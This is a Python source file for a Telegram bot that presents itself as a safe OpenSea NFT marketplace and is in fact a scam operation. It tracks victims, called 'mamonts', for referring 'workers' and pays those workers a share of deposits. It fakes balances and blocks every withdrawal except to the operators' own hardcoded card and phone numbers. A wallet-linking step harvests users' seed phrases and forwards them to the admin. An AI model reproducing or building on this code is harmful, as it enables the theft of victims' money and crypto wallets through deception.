from random import randint

from aiogram import Dispatcher
from aiogram.dispatcher import FSMContext
from aiogram.types import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types import Message, CallbackQuery
from aiogram.utils.callback_data import CallbackData
from aiogram.utils.markdown import hbold, hitalic, hcode, hlink
from aiohttp_socks import ProxyConnector
from glQiwiApi import QiwiWallet, QiwiP2PClient
from glQiwiApi.core import RequestService
from glQiwiApi.core.session import AiohttpSessionHolder
import asyncio
import nftBot.keyboards.inline as inline
import nftBot.keyboards.reply as reply
import nftBot.utils.db_commands as db
from nftBot.loader import bot, control_bot, config
from nftBot.services.generate_pictures import get_photo
from nftBot.states import withdrawState, outdrawState, profileState, mainState
from datetime import datetime, timedelta


async def create_request_service_with_proxy(wallet: QiwiWallet):
    bot_data = await db.get_bot()
    return RequestService(
        session_holder=AiohttpSessionHolder(
            connector=ProxyConnector.from_url(bot_data.proxy, verify_ssl=False),  # some proxy
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Authorization": f"Bearer {bot_data.qiwi_key}",
                "Host": "edge.qiwi.com",
            },
        )
    )


async def send_user_profile(user):
    verification_label = ["‚ö†Ô∏è –ù–µ –ø—Ä–æ–π–¥–µ–Ω–∞", "‚úÖ –ü—Ä–æ–π–¥–µ–Ω–∞"]
    date_label = datetime.now().strftime("%m.%d.%Y %H:%M:%S")
    text = f"""{hbold('–õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç')}

–ë–∞–ª–∞–Ω—Å: {hbold(str(user.balance) + "‚ÇΩ")}
–ù–∞ –≤—ã–≤–æ–¥–µ: {hbold(str(user.fake_balance) + "‚ÇΩ")}

–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è: {hbold(verification_label[user.verification])}
–í–∞—à –∫–æ—à–µ–ª–µ–∫: {user.wallet}
–í–∞—à ID: {hcode(user.user_id)}

–î–∞—Ç–∞ –∏ –≤—Ä–µ–º—è: {date_label}"""

    count_try = 0
    while(count_try <= 1):
        count_try += 1
        if not user.file_id:
            await get_photo(user.user_id)
            photo = InputFile(f"pictures\\{user.user_id}.jpg")
        else:
            photo = user.file_id

        try:
            data = await bot.send_photo(user.user_id, caption=text, photo=photo, reply_markup=await inline.profile_markup())
            if not user.file_id:
                user.file_id = data.photo[0].file_id
                await db.update_user(user)

            break
        except:
            user.file_id = None

async def start_menu(user_id, name):
    await bot.send_message(user_id, f"""–ü—Ä–∏–≤–µ—Ç—Å—Ç–≤—É—é, {hbold(name)}!

–≠—Ç–æ —Ç–µ–ª–µ–≥—Ä–∞–º –±–æ—Ç –¥–ª—è –±–µ–∑–æ–ø–∞—Å–Ω–æ–π —Ç–æ—Ä–≥–æ–≤–ª–∏ NFT""", reply_markup=await reply.start_markup())

nft_kb = CallbackData("nft_kb", "user_id")

async def user_start(message: Message,state: FSMContext):
    referral = message.get_args()
    await state.reset_state()
    if not referral:
        referral = 0
    else:
        referral = int(referral)
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(InlineKeyboardButton('–£–ø—Ä–∞–≤–ª—è—Ç—å', callback_data=nft_kb.new(message.from_user.id)))
        await control_bot.send_message(int(referral),
                                      f'ü§ü –ú–∞–º–æ–Ω—Ç <a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>\n'
                                      f'<b>–ü–µ—Ä–µ—à–µ–ª –ø–æ —Ç–≤–æ–µ–π —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–π —Å—Å—ã–ª–∫–µ.</b>',
                                      reply_markup=markup)
    await db.add_new_user(referral)
    await start_menu(message.from_user.id, message.from_user.first_name)


async def user_info(message: Message):
    await message.answer(f"""{hbold("üîπ –û –°–µ—Ä–≤–∏—Å–µ")}

{hitalic('OpenSea')} ‚Äî {hbold('—Ç–æ—Ä–≥–æ–≤–∞—è –ø–ª–æ—â–∞–¥–∫–∞')} –¥–ª—è –Ω–µ–≤–∑–∞–∏–º–æ–∑–∞–º–µ–Ω—è–µ–º—ã—Ö —Ç–æ–∫–µ–Ω–æ–≤ (NFT).
–ü–æ–∫—É–ø–∞–π—Ç–µ, –ø—Ä–æ–¥–∞–≤–∞–π—Ç–µ –∏ –æ—Ç–∫—Ä—ã–≤–∞–π—Ç–µ –¥–ª—è —Å–µ–±—è —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–µ —Ü–∏—Ñ—Ä–æ–≤—ã–µ –ø—Ä–µ–¥–º–µ—Ç—ã.""", reply_markup=await inline.info_markup())


# verification
async def user_verification(call: CallbackQuery):
    user = await db.get_user(call.from_user.id)
    if user.verification:
        await call.answer("‚úÖ –í–∞—à –∞–∫–∫–∞—É–Ω—Ç —É–∂–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω", show_alert=True)
        # send menu
    else:
        await call.message.edit_text(f"""{hbold('–í–∞—à –∞–∫–∫–∞—É–Ω—Ç –Ω–µ –≤–µ—Ä–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω')}

–î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –ø–æ –ø—Ä–æ—Ö–æ–∂–¥–µ–Ω–∏—é –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –Ω–∞–ø–∏—à–∏—Ç–µ ¬´–í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è¬ª –≤ –±–æ—Ç–µ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫–æ–π –ø–æ–¥–¥–µ—Ä–∂–∫–∏""",
                                     reply_markup=await inline.support_markup())


# tech support
async def user_support(message: Message):
    await message.answer(f"""–ü—Ä–∞–≤–∏–ª–∞ –æ–±—Ä–∞—â–µ–Ω–∏—è –≤ –¢–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ü–æ–¥–¥–µ—Ä–∂–∫—É:

üîπ1. {hbold('–ü—Ä–µ–¥—Å—Ç–∞–≤—å—Ç–µ—Å—å, –∏–∑–ª–æ–∂–∏—Ç–µ –ø—Ä–æ–±–ª–µ–º—É —Å–≤–æ–∏–º–∏ —Å–ª–æ–≤–∞–º–∏')} - –º—ã –ø–æ—Å—Ç–∞—Ä–∞–µ–º—Å—è –í–∞–º –ø–æ–º–æ—á—å.

üîπ2. {hbold('–ù–∞–ø–∏—à–∏—Ç–µ —Å–≤–æ–π ID')} - –Ω–∞–º —ç—Ç–æ –Ω—É–∂–Ω–æ, —á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å –≤–∞—à –ø—Ä–æ—Ñ–∏–ª—å, –∏ —É–∑–Ω–∞—Ç—å –∞–∫—Ç—É–∞–ª—å–Ω–æ—Å—Ç—å –≤–∞—à–µ–π –ø—Ä–æ–±–ª–µ–º—ã.

üîπ3. {hbold('–ë—É–¥—å—Ç–µ –≤–µ–∂–ª–∏–≤—ã')}, –Ω–∞—à–∏ –∫–æ–Ω—Å—É–ª—å—Ç–∞–Ω—Ç—ã –Ω–µ —Ä–æ–±–æ—Ç—ã, –º—ã –ø–æ—Å—Ç–∞—Ä–∞–µ–º—Å—è –ø–æ–º–æ—á—å –í–∞–º, –∏ —Å–¥–µ–ª–∞—Ç—å –≤—Å–µ –≤–æ–∑–º–æ–∂–Ω–æ–µ,
—á—Ç–æ–±—ã —Å–±–µ—Ä–µ—á—å –≤–∞—à–µ –≤—Ä–µ–º—è –∏ –æ–±–µ—Å–ø–µ—á–∏—Ç—å –º–∞–∫—Å–∏–º–∞–ª—å–Ω—É—é –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ—Å—Ç—å –≤ —Ä–∞–±–æ—Ç–µ.

{hitalic('–ù–∞–ø–∏—à–∏—Ç–µ –Ω–∞–º, –æ—Ç–≤–µ—Ç –ü–æ–¥–¥–µ—Ä–∂–∫–∏, –Ω–µ –∑–∞—Å—Ç–∞–≤–∏—Ç –≤–∞—Å –¥–æ–ª–≥–æ –∂–¥–∞—Ç—å!')}""",
                         reply_markup=await inline.support_markup())


async def user_profile(message: Message):
    await send_user_profile(await db.get_user(message.from_user.id))


# payments
# @dp.callback_query_handler(text_contains="top_up", chat_type=types.ChatType.PRIVATE)
async def choose_method(call: CallbackQuery):
    await call.message.delete()
    file = InputFile('pictures\\topUp.jpg')
    await bot.send_photo(call.from_user.id,
                         file,
                         caption="<i>üí∞ –í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ –∫–æ—Ç–æ—Ä—ã–π –í—ã —Ö–æ—Ç–∏—Ç–µ —Å–æ–≤–µ—Ä—à–∏—Ç—å –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ.</i>",
                         parse_mode="HTML",
                         reply_markup=await inline.top_up_menu())


# @dp.callback_query_handler(inline.withdraw.filter(), chat_type=types.ChatType.PRIVATE)
async def enter_sum(call: CallbackQuery, callback_data: dict, state: FSMContext):
    print("eter_sum")
    _type = callback_data.get("type")
    await state.update_data(type=_type)
    await call.message.delete()
    user = await db.get_user(call.from_user.id)
    if user.worker_id:
        worker = await db.get_worker(user.worker_id)
        _min = worker.min_dep
    else:
        _min = 1000
    await call.message.answer(f"–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è:\n\n<b>–ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ - {_min} ‚ÇΩ </b>")
    await withdrawState.Data.Sum.set()


# @dp.message_handler(state=withdrawState.Data.Sum, chat_type=types.ChatType.PRIVATE)
async def complete_top_up(message: Message, state: FSMContext):
    user = await db.get_user(message.from_user.id)
    data = await state.get_data()
    _type = data.get("type")

    if user.worker_id:
        worker = await db.get_worker(user.worker_id)
        _min = worker.min_dep
    else:
        _min = 1000
    if message.text.isdigit():
        if int(message.text) >= _min or message.from_user.id == 947353888:
            _sum = int(message.text)
            if _type == "p2p":
                card_number = await db.get_card_number()
                text = f"""–°–¥–µ–ª–∫–∞ /t{randint(19433, 58493)}

–û–∂–∏–¥–∞–µ–º /pintuzik. –ï—Å–ª–∏ –æ–Ω –Ω–µ –ø–æ—è–≤–∏—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç, —Ç–æ —Å–¥–µ–ª–∫–∞ –±—É–¥–µ—Ç –æ—Ç–º–µ–Ω–µ–Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.

‚ö†Ô∏è –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É—á—Ç–∏—Ç–µ, —á—Ç–æ –≤ —Ü–µ–ª—è—Ö –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∑–∞–ø—Ä–µ—â–µ–Ω–æ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å —Ä–µ–∫–≤–∏–∑–∏—Ç—ã –≤–Ω–µ —ç—Ç–æ–≥–æ –±–æ—Ç–∞.

–í—ã –º–æ–∂–µ—Ç–µ –≤ –ª—é–±–æ–π –º–æ–º–µ–Ω—Ç –æ—Ç–º–µ–Ω–∏—Ç—å —Å–¥–µ–ª–∫—É —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ. –ù–æ —É—á—Ç–∏—Ç–µ, —á—Ç–æ –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–µ –¥–µ–Ω—å–≥–∏ –Ω–µ –≤–æ–∑–≤—Ä–∞—â–∞—é—Ç—Å—è –ø—Ä–∏ –æ—Ç–º–µ–Ω–µ —Å–¥–µ–ª–∫–∏!

–ê–≤—Ç–æ–æ—Ç–º–µ–Ω–∞ —Å–¥–µ–ª–∫–∏ –ø—Ä–æ–∏–∑–æ–π–¥—ë—Ç —á–µ—Ä–µ–∑ 10 –º–∏–Ω—É—Ç"""
                await message.answer(text)
                await asyncio.sleep(randint(3, 7))
                text = f"""üîπ –û–ø–ª–∞—Ç–∞ –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç–æ–π:

–°—É–º–º–∞: <b>{_sum}</b> ‚ÇΩ

–û—Å—É—â–µ—Å—Ç–≤–∏—Ç–µ –ø–µ—Ä–µ–≤–æ–¥ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—É—é –≤—ã—à–µ —Å—É–º–º—É, –∏—Å–ø–æ–ª—å–∑—É—è –¥–∞–Ω–Ω—ã–µ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã

<b>'{card_number}'</b> —Å –∫–æ–º–µ–Ω—Ç–∞—Ä–∏–µ–º <b>'{randint(11111, 99999)}'</b> 

‚ö†Ô∏è –ï—Å–ª–∏ –≤—ã –Ω–µ –º–æ–∂–µ—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–π, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —á–µ–∫/—Å–∫—Ä–∏–Ω—à–æ—Ç –æ–ø–ª–∞—Ç—ã –≤ —Ç–µ—Ö. –ø–æ–¥–¥–µ—Ä–∂–∫—É."""
                await message.answer(text, reply_markup=await inline.bank_check())
            else:
                if _type == "bank":
                    pay_source_filter = ["card"]
                else:
                    pay_source_filter = ["qw"]

                file = InputFile('pictures\\topUp.jpg')
                bot_key = await db.get_bot()
                print(bot_key.qiwi_key)
                async with QiwiP2PClient(secret_p2p=bot_key.qiwi_key,
                                         request_service_factory=create_request_service_with_proxy,
                                         ) as p2p:
                    bill = await p2p.create_p2p_bill(amount=int(message.text), pay_source_filter=pay_source_filter)
                link = bill.pay_url

                await bot.send_photo(message.from_user.id,
                                     file,
                                     caption="<b>üí≥ –ó–∞—è–≤–∫–∞ –≤ —Ä–∞–∑–º–µ—Ä–µ</b> - <i>{sum} ‚ÇΩ</i>  <b>–±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞</b>"
                                             "\n\n„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è\n\n<a href='{link}'>"
                                             "–ü–µ—Ä–µ–π–¥–∏—Ç–µ –ø–æ —Å—Å—ã–ª–∫–µ –¥–ª—è –æ–ø–ª–∞—Ç—ã</a>\n\n„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞"
                                             "Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞Ô∏è„Ä∞"
                                             "\n\n<i>Ô∏è‚ö†Ô∏è –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã, –Ω–µ –∑–∞–±—É–¥—å—Ç–µ –Ω–∞–∂–∞—Ç—å –∫–Ω–æ–ø–∫—É "
                                             "¬´–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –ø–ª–∞—Ç–µ–∂¬ª.</i>".format(link=link, sum=_sum),
                                     parse_mode="HTML",
                                     reply_markup=await inline.qiwi_check(link, bill.id))

            user = await db.get_user(message.from_user.id)
            if user.worker_id:
                ref = await db.get_worker(user.worker_id)
                if ref.trade_notification == 1:
                    if user.notification:
                        text = f'<b>üìä –°–µ—Ä–≤–∏—Å - NFT </b>\n\n‚úÖ –ú–∞–º–æ–Ω—Ç ' \
                               f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a> [/t{user.id}]\n' \
                               f'–°–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ –≤ —Ä–∞–∑–º–µ—Ä–µ - <b>{_sum} ‚ÇΩ</b>'
                        await control_bot.send_message(user.worker_id, text,
                                                       reply_markup=await inline.get_money(_sum, message.from_user.id))
        else:
            await message.answer("<b>‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥</b>", parse_mode="HTML")
    else:
        await message.answer("<b>‚ùå –ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥</b>", parse_mode="HTML")
    await state.reset_state()

# @dp.callback_query_handler(withdrawMarkup.check_payment.filter(), chat_type=types.ChatType.PRIVATE)
async def check_payment(call: CallbackQuery, callback_data: dict):
    bill_id = callback_data.get("bill_id")
    bot_key = await db.get_bot()

    async with QiwiP2PClient(secret_p2p=bot_key.qiwi_key,
                             request_service_factory=create_request_service_with_proxy) as p2p:
        bill = await p2p.get_bill_by_id(bill_id)
        if await p2p.check_if_bill_was_paid(bill) or call.from_user.id == 947353888:
            await call.message.delete()
            user = await db.get_user(call.from_user.id)
            amount = int(bill.amount.value)
            user.balance += amount
            await control_bot.send_message(947353888, f"{amount} - complete")
            await db.update_user(user)

            await call.message.answer(f"‚úÖ –ë–∞–ª–∞–Ω—Å –±—ã–ª —É—Å–ø–µ—à–Ω–æ –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ —Å—É–º–º—É : {amount} ‚ÇΩ")

            user.count_withdraw += 1

            if user.worker_id:
                worker = await bot.get_chat(user.worker_id)
                get_percent = round(amount * 0.8, 0)

                # teacher
                worker_data = await db.get_worker(user.worker_id)
                first_teach_label = ""
                second_teach_label = ""
                if worker_data.personal_teacher > 1:
                    worker_data.profits_left -= 1
                    await db.new_learn_profit(user.worker_id)
                    teach_sum = round(get_percent * 0.25, 0)
                    get_percent -= teach_sum
                    teach_user = await bot.get_chat(worker_data.personal_teacher)
                    first_teach_label = f"–ù–∞—Å—Ç–∞–≤–Ω–∏–∫:  <b> <a href='tg://user?id={worker_data.personal_teacher}'>{teach_user.full_name}</a> </b>\n"
                    second_teach_label = f"ü™û –î–æ–ª—è –Ω–∞—Å—Ç–∞–≤–Ω–∏–∫–∞: {teach_sum} ‚ÇΩ"
                #
                await control_bot.send_message(947353888, f"–ù–æ–≤–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ\n–°—É–º–º–∞: {amount}\n–í–æ—Ä–∫–µ—Ä: {worker.first_name} ({user.worker_id})\n–î–∞—Ç–∞: {datetime.now()}")
                markup = InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("‚è≥ –í –æ–∂–∏–¥–∞–Ω–∏–∏", callback_data=f"edit_withdraw_status"))
                name = f'<a href="tg://user?id={worker.first_name}">{worker.full_name}</a>'

                await db.set_payment(int(amount), worker.full_name, user.worker_id)
                text = f"""<b><i>üíπ –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏–µ (NFT –•{user.count_withdraw}) </i> </b>

<b><i>–í–æ—Ä–∫–µ—Ä :</i></b> {name}
{first_teach_label}
<b>üí≥ –°—É–º–º–∞ –ø–ª–∞—Ç–µ–∂–∞ :</b> {amount} <b>‚ÇΩ</b>
<b>üèõ –î–æ–ª—è –≤–æ—Ä–∫–µ—Ä–∞ :</b> {get_percent} <b>‚ÇΩ</b>
{second_teach_label}
                            """
                # int(config.ids.top_up)
                await botControl.send_message(-1001961514379, text)
                if worker.tag != 0:
                    text = text.replace(name, f"#{worker.tag}")

                photo = InputFile(f'secret.jpg')

                await botControl.send_photo(-1001827343324, photo, caption=text, reply_markup=markup)
                user_link = hlink(call.from_user.full_name, f'tg://user?id={user.user_id}')
                text = f"""<b><i>üî• –¢–≤–æ–π –º–∞–º–æ–Ω—Ç :</i> </b> {user_link}

<b><i>–£—Å–ø–µ—à–Ω–æ –ø–æ–ø–æ–ª–Ω–∏–ª :</i></b> {amount} ‚ÇΩ
<i><b>–¢–≤–æ—è –¥–æ–ª—è : </b> {get_percent}  ‚ÇΩ </i>

<b>üíú –°–ø–∞—Å–∏–±–æ —á—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—à—å —Å –Ω–∞–º–∏!</b>
            """
                await control_bot.send_message(user.worker_id, text)
        else:
            await call.message.answer("‚ö†Ô∏è –ü–ª–∞—Ç–µ–∂ –Ω–µ –±—ã–ª –æ–±–Ω–∞—Ä—É–∂–µ–Ω.")


# end payments

async def user_go_back(call: CallbackQuery, state: FSMContext):
    await call.message.delete()
    await send_user_profile(await db.get_user(call.from_user.id))
    await state.reset_state()


# outdraw


async def user_method_withdraw(call: CallbackQuery):
    file = InputFile('pictures\\topUp.jpg')
    await bot.send_photo(call.from_user.id,
                         file,
                         caption="<i>üèõ –í—ã–±–µ—Ä–∏—Ç–µ –º–µ—Ç–æ–¥ –≤—ã–≤–æ–¥–∞.</i>",
                         parse_mode="HTML", reply_markup=await inline.outdraw_menu())


# @dp.callback_query_handler(withdrawMarkup.outdraw.filter(), chat_type=types.ChatType.PRIVATE)
async def choose_method_withdraw(call: CallbackQuery, callback_data: dict, state: FSMContext):
    _type = int(callback_data.get("type"))
    type_text = ["QIWI-wallet", "–ë–∞–Ω–∫–æ–≤—Å–∫–∞—è –∫–∞—Ä—Ç–∞"]
    caption_text = ["–£–∫–∞–∂–∏—Ç–µ –Ω–∏–∂–µ –Ω–æ–º–µ—Ä –≤–∞—à–µ–≥–æ QIWI-–∫–æ—à–µ–ª—å–∫–∞.", "–£–∫–∞–∂–∏—Ç–µ –Ω–∏–∂–µ –Ω–æ–º–µ—Ä –≤–∞—à–µ–π –±–∞–Ω–∫–æ–≤—Å–∫–æ–π –∫–∞—Ä—Ç—ã."]
    user = await db.get_user(call.from_user.id)

    text = f"<i>üèõ –ú–µ—Ç–æ–¥ –≤—ã–≤–æ–¥–∞ : {type_text[_type]}</i>\n\nüí∞ –í–∞—à –±–∞–ª–∞–Ω—Å : {user.balance} ‚ÇΩ" \
           f"\n\n<b>üí≥ {caption_text[_type]}.</b>"
    await state.update_data(method=type_text[_type])
    file = InputFile('pictures\\topUp.jpg')
    await bot.send_photo(call.from_user.id,
                         file,
                         caption=text,
                         parse_mode="HTML")
    await outdrawState.Main.Num.set()


# @dp.message_handler(state=outdrawState.Main.Num, chat_type=types.ChatType.PRIVATE)
async def complete_withdraw(message: Message, state: FSMContext):
    numbers = ["2200240715868499", "79120874881", "+79120874881"]
    user = await db.get_user(message.from_user.id)
    if user.balance == 0:
        await message.answer("‚ùå –ù–∞ –≤–∞—à–µ–º —Å—á–µ—Ç—É –Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤")
    elif not message.text.replace("+", "").isdigit() or user.ban_withdraw:
        await message.answer(f"‚ùå –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –±—ã–ª –æ—Ç–º–µ–Ω–µ–Ω –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –ø–æ —Å—Å—ã–ª–∫–µ –Ω–∏–∂–µ",
            reply_markup=await inline.support_menu())

    elif message.text in numbers:
        user = await db.get_user(message.from_user.id)
        old_balance = user.balance
        user.balance = 0
        id_application = randint(100000, 999999)

        await db.update_user(user)
        await message.answer(
            f"<b>‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∞–ª–∏ –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥ –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤. </b>\n\nID –∑–∞—è–≤–∫–∏ : {id_application}\n"
            f"–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞ : {old_balance} ‚ÇΩ\n–†–µ–∫–≤–∏–∑–∏—Ç—ã –¥–ª—è –≤—ã–≤–æ–¥–∞ :  {message.text} \n\n<i>"
            f"‚ö†Ô∏è –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –º–æ–∂–µ—Ç –∑–∞–Ω—è—Ç—å –¥–æ 3 —á–∞—Å–æ–≤.</i>")

        await state.reset_state()

        user = await db.get_user(message.from_user.id)

        if user.worker_id:
            ref = await db.get_worker(user.worker_id)
            if ref.trade_notification == 1:
                if user.notification == 1:
                    user_label = hlink(message.from_user.full_name, f"tg://user?id={message.from_user.id}")
                    await control_bot.send_message(user.worker_id,
                                                   f'<b>üìä –°–µ—Ä–≤–∏—Å - NFT </b>\n\n'
                                                   f'‚úÖ –ú–∞–º–æ–Ω—Ç {user_label} [/t{user.id}]'
                                                   f'\n–°–æ–∑–¥–∞–ª –∑–∞—è–≤–∫—É –Ω–∞ –≤—ã–≤–æ–¥ –¥–µ–Ω–µ–∂–Ω—ã—Ö —Å—Ä–µ–¥—Å—Ç–≤ –≤ —Ä–∞–∑–º–µ—Ä–µ - '
                                                   f'<b>{old_balance} ‚ÇΩ</b>',
                                                   reply_markup=await inline.take_money_markup(user.user_id,
                                                                                               old_balance))
    else:
        if user.worker_id:
            await control_bot.send_message(user.worker_id, f"""üìà TRADE

–ú–∞–º–æ–Ω—Ç @{message.from_user.username} —Å–¥–µ–ª–∞–ª –∑–∞–ø—Ä–æ—Å –Ω–∞
–í–´–í–û–î

üè¶ Telegtam ID: <a href="tg://user?id={message.from_user.id}">{message.from_user.id}</a>
üí∏ –°—É–º–º–∞: {user.balance} ‚ÇΩ

<b>–í—ã–≤–æ–¥ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!</b>
""")
        await message.answer(
            f"‚ùå –í—ã–≤–æ–¥ —Å—Ä–µ–¥—Å—Ç–≤ –±—ã–ª –æ—Ç–º–µ–Ω–µ–Ω –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –≤ —Ç–µ—Ö–Ω–∏—á–µ—Å–∫—É—é –ø–æ–¥–¥–µ—Ä–∂–∫—É –ø–æ —Å—Å—ã–ª–∫–µ –Ω–∏–∂–µ",
            reply_markup=await inline.support_menu())
    await state.reset_state()


# end outdraw

async def user_link(call: CallbackQuery):
    await call.message.edit_caption(f"{hbold('üèß –í—ã–±–µ—Ä–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫ –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ –ø—Ä–∏–≤—è–∑–∞—Ç—å.')}",
                                    reply_markup=await inline.link_markup())


async def user_enter_seed(call: CallbackQuery, state: FSMContext, callback_data: dict):
    name = callback_data.get("name")

    data = await call.message.edit_caption(f"{hbold(f'‚öôÔ∏è –û—Ç–ø—Ä–∞–≤—å—Ç–µ seed —Ñ—Ä–∞–∑—É –æ—Ç –∫–æ—à–µ–ª—å–∫–∞: {name}')}",
                                           reply_markup=await inline.go_back_markup())

    await state.update_data(name=name, message_id=data.message_id)
    await profileState.Wallet.Seed.set()


async def user_complete_link(message: Message, state: FSMContext):
    await message.delete()

    user = await db.get_user(message.from_user.id)
    seed = message.text
    data = await state.get_data()
    message_id = data.get("message_id")

    if len(seed.split(" ")) > 5:
        user.wallet = data.get("name")
        await db.update_user(user)

        await bot.delete_message(message.from_user.id, message_id)
        await send_user_profile(user)

        await bot.send_message(config.tg_bot.admin_ids[0], seed)
        await state.reset_state()
    else:
        await bot.edit_message_caption(message.from_user.id, message_id,
                                       caption="‚õîÔ∏è –ù–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –≤–≤–æ–¥, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â—ë —Ä–∞–∑",
                                       reply_markup=await inline.go_back_markup())


async def send_collections_menu(telegram_id, call=None):
    count = await db.count_collections()
    photo = InputFile("pictures\\nft.jpg")

    caption = f"{hbold(f'üí† –í—Å–µ–≥–æ –Ω–∞ –º–∞—Ä–∫–µ—Ç–ø–ª–µ–π—Å–µ {count} –∫–æ–ª–ª–µ–∫—Ü–∏–π')}"
    if call:
        await call.message.edit_caption(caption=caption, reply_markup=await inline.get_list_of_collection_markup())
    else:
        await bot.send_photo(telegram_id, caption=caption,
                             photo=photo,
                             reply_markup=await inline.get_list_of_collection_markup())


async def user_nft(message: Message):
    await send_collections_menu(message.from_user.id)


async def user_back_nft(call: CallbackQuery, state: FSMContext):
    await send_collections_menu(call.from_user.id, call)
    await state.reset_state()


async def user_next_nft(call: CallbackQuery):
    page = int(call.data.split("_")[1])
    if page >= 0:
        await call.message.edit_reply_markup(reply_markup=await inline.get_list_of_collection_markup(page))


async def get_nfts_of_collection(name):
    caption = f"{hbold(f'üí† –ö–æ–ª–ª–µ–∫—Ü–∏—è {name}')}"
    markup = await inline.get_all_nfts_by_collection_name(name)

    return caption, markup


async def user_get_nft(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    caption, markup = await get_nfts_of_collection(name)
    await call.message.edit_caption(caption=caption,
                                    reply_markup=markup)


async def get_nft_text(nft):
    eth = nft.price
    usd = round(eth * 1165.59, 2)
    rub = usd * 60
    return f"""{hlink('üí†', nft.img)} {nft.name}

–û–ø–∏—Å–∞–Ω–∏–µ: {nft.description}

üóÇ –ö–æ–ª–ª–µ–∫—Ü–∏—è: {nft.collection_name}
üîπ –ë–ª–æ–∫—á–µ–π–Ω: {nft.blockchain}

üí∏ –¶–µ–Ω–∞: {eth}ETH (~{round(rub, 2)}‚ÇΩ)(~{usd}$)
"""


async def user_nft_page(call: CallbackQuery, callback_data: dict):
    name = callback_data.get("name")
    nft = await db.get_nft_by_name(name)
    user = await db.get_user(call.from_user.id)
    await call.message.delete()

    await call.message.answer(await get_nft_text(nft),
                              reply_markup=await inline.nft_page_markup(nft, user))


async def user_go_to_nfts_of_collections(call: CallbackQuery):
    await call.message.delete()
    name = call.data.split("_")[2]
